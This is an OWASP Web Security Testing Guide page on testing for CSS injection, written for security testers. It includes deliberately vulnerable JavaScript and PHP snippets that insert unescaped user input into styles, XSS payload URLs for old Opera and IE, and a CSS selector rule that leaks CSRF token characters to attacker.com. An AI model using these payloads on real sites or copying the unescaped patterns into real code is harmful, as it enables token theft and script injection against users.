# WSTG - Latest
[Home](https://owasp.org/www-project-web-security-testing-guide/) > [Latest](https://owasp.org/www-project-web-security-testing-guide/latest/) > [4-Web Application Security Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/) > [11-Client-side Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/)
# Testing for CSS Injection
ID  
---  
WSTG-CLNT-05  
## Summary
A CSS Injection vulnerability involves the ability to inject arbitrary CSS code in the context of a trusted web site which is rendered inside a victim’s browser. The impact of this type of vulnerability varies based on the supplied CSS payload. It may lead to cross site scripting or data exfiltration.
This vulnerability occurs when the application allows user-supplied CSS to interfere with the application’s legitimate style sheets. Injecting code in the CSS context may provide an attacker with the ability to execute JavaScript in certain conditions, or to extract sensitive values using CSS selectors and functions able to generate HTTP requests. Generally, allowing users the ability to customize pages by supplying custom CSS files is a considerable risk.
The following JavaScript code shows a possible vulnerable script in which the attacker is able to control the `location.hash` (source) which reaches the `cssText` function (sink). This particular case may lead to DOM-based XSS in older browser versions; for more information, see the [DOM-based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).
```
<a id="a1">Click me</a>
<script>
    if (location.hash.slice(1)) {
    document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
    }
</script>

```

The attacker could target the victim by asking them to visit the following URLs:
  * `www.victim.com/#red;-o-link:'<javascript:alert(1)>';-o-link-source:current;` (Opera [8,12])
  * `www.victim.com/#red;-:expression(alert(URL=1));` (IE 7/8)


The same vulnerability may appear in the case of reflected XSS, for example, in the following PHP code:
```
<style>
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}
</style>

```

Further attack scenarios involve the ability to extract data through the adoption of pure CSS rules. Such attacks can be conducted through CSS selectors, leading to the exfiltration of data, for example, CSRF tokens.
Here is an example of code that attempts to select an input with a `name` matching `csrf_token` and a `value` beginning with an `a`. By utilizing a brute-force attack to determine the attribute’s `value`, it is possible to carry out an attack that sends the value to the attacker’s domain, such as by attempting to set a background image on the selected input element.
```
<style>
input[name=csrf_token][value=^a] {
    background-image: url(https://attacker.com/log?a);
}
</style>

```

Other attacks using solicited content such as CSS are highlighted in [Mario Heiderich’s talk, “Got Your Nose”](https://www.youtube.com/watch?v=FIQvAaZj_HA) on YouTube.
## Test Objectives
  * Identify CSS injection points.
  * Assess the impact of the injection.


## How to Test
Code should be analyzed to determine if a user is permitted to inject content in the CSS context. Particularly, the way in which the website returns CSS rules on the basis of the inputs should be inspected.
The following is a basic example:
```
<a id="a1">Click me</a>
<b>Hi</b>
<script>
    $("a").click(function(){
        $("b").attr("style","color: " + location.hash.slice(1));
    });
</script>

```

The above code contains a source `location.hash`, controlled by the attacker, that can inject directly in the `style` attribute of an HTML element. As mentioned above, this may lead to different results depending on the browser in use and the supplied payload.
The following pages provide examples of CSS injection vulnerabilities:
  * [Password “cracker” via CSS and HTML5](https://html5sec.org/invalid/?length=25)
  * [JavaScript based attacks using `CSSStyleDeclaration` with unescaped input](https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink)


For further OWASP resources on preventing CSS injection, see the [Securing Cascading Style Sheets Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html).
* * *
[Edit on GitHub](https://github.com/OWASP/www-project-web-security-testing-guide/blob/master/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection.md)
**The OWASP ® Foundation** works to improve the security of software through its community-led open source software projects, hundreds of chapters worldwide, tens of thousands of members, and by hosting local and global conferences. 
## Spotlight: Zimperium
[![image](https://owasp.org/assets/images/corp-member-logo/Zimperiumlogo_300x90px.jpeg)](https://www.zimperium.com/)
Zimperium is the world leader in mobile security for iOS, Android and ChromeOS. Zimperium solutions, including Mobile Threat Defense (MTD) and Mobile Application Protection Suite (MAPS), offer comprehensive mobile security for enterprises. MTD is a privacy-first application that provides mobile risk assessments, insights into application vulnerabilities, and robust threat protection. It is used to secure both corporate-owned and bring-your-own (BYO) devices against advanced mobile threats across device, network, phishing, app risks, and malware vectors. MAPS delivers in-app protection to safeguard applications from attacks and ensure data integrity. Together, these solutions empower security teams to effectively manage and mitigate mobile threats.
## Corporate Supporters
[![image](https://owasp.org/assets/images/corp-member-logo/fortify__logo__normal2x_1.png)](https://www.microfocus.com/en-us/cyberres/application-security)[![image](https://owasp.org/assets/images/corp-member-logo/Automattic.png)](https://automattic.com/)[![image](https://owasp.org/assets/images/corp-member-logo/Equixly.png)](https://equixly.com)[![image](https://owasp.org/assets/images/corp-member-logo/tenable_logo.png)](https://www.tenable.com)[![image](https://owasp.org/assets/images/corp-member-logo/ZINAD.png)](http://www.zinad.net)[![image](https://owasp.org/assets/images/corp-member-logo/Rakuten2022.png)](https://global.rakuten.com/corp/)[![image](https://owasp.org/assets/images/corp-member-logo/Adobe.png)](http://trust.adobe.com)[![image](https://owasp.org/assets/images/corp-member-logo/Cobalt.png)](https://www.cobalt.io/)[![image](https://owasp.org/assets/images/corp-member-logo/JitLogo.png)](https://jit.io)
[Become a corporate supporter](https://owasp.org/supporters)
[](https://github.com/OWASP/) [](https://owasp.org/slack/invite) [](https://www.facebook.com/OWASPFoundation) [](https://infosec.exchange/@owasp) [](https://twitter.com/owasp) [](https://www.linkedin.com/company/owasp/) [](https://www.youtube.com/user/OWASPGLOBAL)
  * [HOME](https://owasp.org/)
  * [PROJECTS](https://owasp.org/projects/)
  * [CHAPTERS](https://owasp.org/chapters/)
  * [EVENTS](https://owasp.org/events/)
  * [ABOUT](https://owasp.org/about/)
  * [PRIVACY](https://owasp.org/www-policy/operational/privacy)
  * [SITEMAP](https://owasp.org/sitemap/)
  * [CONTACT](https://owasp.org/contact/)


OWASP, the OWASP logo, and Global AppSec are registered trademarks and AppSec Days, AppSec California, AppSec Cali, SnowFROC, OWASP Boston Application Security Conference, and LASCON are trademarks of the OWASP Foundation, Inc. Unless otherwise specified, all content on the site is Creative Commons Attribution-ShareAlike v4.0 and provided without warranty of service or accuracy. For more information, please refer to our [General Disclaimer](https://owasp.org/www-policy/operational/general-disclaimer.html). OWASP does not endorse or recommend commercial products or services, allowing our community to remain vendor neutral with the collective wisdom of the best minds in software security worldwide. Copyright 2025, OWASP Foundation, Inc. 
